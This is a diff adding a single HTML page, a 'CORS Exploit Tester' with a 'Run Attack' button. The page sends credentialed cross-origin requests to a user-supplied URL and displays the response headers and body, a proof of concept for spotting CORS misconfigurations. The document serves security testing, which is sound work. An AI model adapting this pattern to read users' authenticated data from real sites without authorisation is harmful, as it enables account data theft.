@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>CORS Exploit Tester</title>
+  <style>
+    body {
+      font-family: monospace;
+      background: #121212;
+      color: #00ff99;
+      padding: 20px;
+    }
+    input, button {
+      padding: 8px;
+      margin: 5px 0;
+      width: 100%;
+      background: #1f1f1f;
+      color: #00ff99;
+      border: 1px solid #00ff99;
+    }
+    #output {
+      white-space: pre-wrap;
+      background: #1f1f1f;
+      padding: 15px;
+      margin-top: 10px;
+      border: 1px solid #00ff99;
+    }
+  </style>
+</head>
+<body>
+  <h2>🚨 CORS Exploit Tester</h2>
+
+  <label>Target URL:</label>
+  <input id="target-url" value="" />
+
+  <label>HTTP Method:</label>
+  <input id="method" value="GET" />
+
+  <button onclick="attemptFetch()">Run Attack</button>
+
+  <div id="output">Output will appear here...</div>
+
+  <script>
+    async function attemptFetch() {
+      const url = document.getElementById('target-url').value;
+      const method = document.getElementById('method').value.toUpperCase();
+      const output = document.getElementById('output');
+
+      output.textContent = "Attempting CORS request...\n";
+
+      try {
+        const res = await fetch(url, {
+          method,
+          credentials: 'include', // send cookies
+          mode: 'cors' // allow reading if CORS headers are correct
+        });
+
+        output.textContent += `Status: ${res.status}\n`;
+        output.textContent += `Headers:\n`;
+        res.headers.forEach((v, k) => {
+          output.textContent += `${k}: ${v}\n`;
+        });
+
+        const contentType = res.headers.get("content-type");
+        if (contentType && contentType.includes("application/json")) {
+          const data = await res.json();
+          output.textContent += `\nBody:\n${JSON.stringify(data, null, 2)}\n`;
+        } else {
+          const text = await res.text();
+          output.textContent += `\nBody:\n${text}\n`;
+        }
+      } catch (err) {
+        output.textContent += `\nError:\n${err.message}`;
+      }
+    }
+  </script>
+</body>
+</html>
